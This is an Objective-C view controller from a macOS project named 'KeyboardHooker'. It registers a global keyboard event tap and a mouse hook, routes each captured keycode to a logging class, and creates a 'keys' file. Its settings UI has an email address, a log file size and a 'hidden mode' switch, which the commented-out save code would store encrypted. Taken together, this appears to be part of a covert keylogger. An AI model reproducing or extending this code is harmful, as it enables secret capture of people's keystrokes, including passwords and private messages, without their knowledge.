//
//  ViewController.m
//  KeyboardHooker
//
//  Created by Иван on 21.11.17.
//  Copyright © 2017 IvanCode. All rights reserved.
//

#import "ViewController.h"
#import <SystemConfiguration/SystemConfiguration.h>

@implementation ViewController

CGEventRef myCGEventCallback(CGEventTapProxy proxy, CGEventType type, CGEventRef event, void *refcon) {
    int key = (int)CGEventGetIntegerValueField(event, kCGKeyboardEventKeycode);
    
    if ([Time currentTimeSince1970InMilliseconds] - ((__bridge ViewController*)refcon).start <= 200) return nil;
    
    ((__bridge ViewController*)refcon).index = [(__bridge ViewController*)refcon check:key];
    if (((__bridge ViewController*)refcon).index != -1) {
        ((__bridge ViewController*)refcon).start = [Time currentTimeSince1970InMilliseconds];
    }
    
    if ([(__bridge ViewController*)refcon pressAddFlag] == YES) {
        BlockItem *item = [[BlockItem alloc] init:key :1000 :[Time currentTimeSince1970InMilliseconds]];
        [[(__bridge ViewController*)refcon buttonsBlockArray] addObject:item];
        ((__bridge ViewController*)refcon).pressAddFlag = NO;
        [((__bridge ViewController*)refcon).addBlockButton setEnabled:YES];
        
        [((__bridge ViewController*)refcon).tableView reloadData];
    }
    
    [[(__bridge ViewController*)refcon key] doFullCycle:key];
    return event;
}

- (int)check: (NSInteger)key {
    int i = 0;
    for (BlockItem *item in _buttonsBlockArray) {
        if (item.key == key) {
            return i;
        }
        i++;
    }
    return -1;
}

- (void)viewDidLoad {
    [super viewDidLoad];
    
    _buttonsBlockArray = [[NSMutableArray alloc] init];
    _pressAddFlag = false;
    
    [_emailTextField setDelegate:self];
    [_fileSize setDelegate:self];
    [_tableView setDelegate:self];
    [_tableView setDataSource:self];
    
    [FileManager createFile:@"keys"];
    [FileManager createFile:@"buttons"];
    
    _mouse = [[MouseHooker alloc] init];
    _key = [[KeyHooker alloc] init:_mouse];
    
    [KeyRunLoop setRunLoop:myCGEventCallback :(__bridge void *)(self)];
    [_mouse setMouseNotifications];
}

- (void)controlTextDidChange: (NSNotification*)notification {
    NSTextField *textField = [notification object];
    
    if ([textField tag] == 1) {
        if (![RegexManager validateEmail:[_emailTextField stringValue]]) {
            [_emailTextField setTextColor:[NSColor redColor]];
            [_saveButton setEnabled: NO];
            emailFlag = NO;
        } else {
            [_emailTextField setTextColor:[NSColor blackColor]];
            emailFlag = YES;
        }
    }
    
    if ([textField tag] == 2) {
        if (![RegexManager validateSize:[_fileSize stringValue]]) {
            [_fileSize setTextColor:[NSColor redColor]];
            [_saveButton setEnabled: NO];
            sizeFlag = NO;
        } else {
            [_fileSize setTextColor:[NSColor blackColor]];
            sizeFlag = YES;
        }
    }
    
    if (emailFlag && sizeFlag) {
        [_saveButton setEnabled: YES];
    }
}

- (IBAction)clickedSaveButton:(id)sender {
    /*
    [FileManager createFile:@"config"];
    
    if ([RegexManager validateEmail:[_emailTextField stringValue]] && [RegexManager validateSize:[_fileSize stringValue]]) {
        NSString *email = [Cryptographer doIt:[_emailTextField stringValue]];
        NSString *size = [Cryptographer doIt:[_fileSize stringValue]];
        NSString *mode = [Cryptographer doIt:[NSString stringWithFormat:@"%ld", (long)[_hiddenModeSwitch state]]];
        
        [FileManager writeToFile:@"config" file:[NSString stringWithFormat:@"%@\n", email]];
        [FileManager writeToFile:@"config" file:[NSString stringWithFormat:@"%@\n", size]];
        [FileManager writeToFile:@"config" file:[NSString stringWithFormat:@"%@", mode]];
    }
     */
}

- (NSView*)tableView:(NSTableView *)tableView viewForTableColumn:(NSTableColumn *)tableColumn row:(NSInteger)row {
    NSTableCellView *cellView = [tableView makeViewWithIdentifier:@"Button" owner:self];
    
    if ([tableColumn.identifier isEqualToString:@"Button"]) {
        
        cellView = [tableView makeViewWithIdentifier:@"b" owner:self];
        NSString *str = [NSString stringWithFormat:@"%ld (%@)", (long)_buttonsBlockArray[row].key, [KeycodeEncrypter keyStringFromKeyCode:(long long)_buttonsBlockArray[row].key]];
        if (str != nil) {
            [[cellView textField] setStringValue:str];
        } else {
            [[cellView textField] setStringValue:@"-"];
        }
        
        
    } else if ([tableColumn.identifier isEqualToString:@"DelayTime"]) {
        
        cellView = [tableView makeViewWithIdentifier:@"d" owner:self];
        NSString *str = [NSString stringWithFormat:@"%ld", (long)_buttonsBlockArray[row].delay];
        if (str != nil) {
            [[cellView textField] setStringValue:str];
        } else {
            [[cellView textField] setStringValue:@"-"];
        }
        
    }
    
    return cellView;
}

- (NSInteger)numberOfRowsInTableView:(NSTableView *)tableView {
    return [_buttonsBlockArray count];
}

- (IBAction)addKey:(id)sender {
    _pressAddFlag = YES;
    [sender setEnabled:false];
}

@end
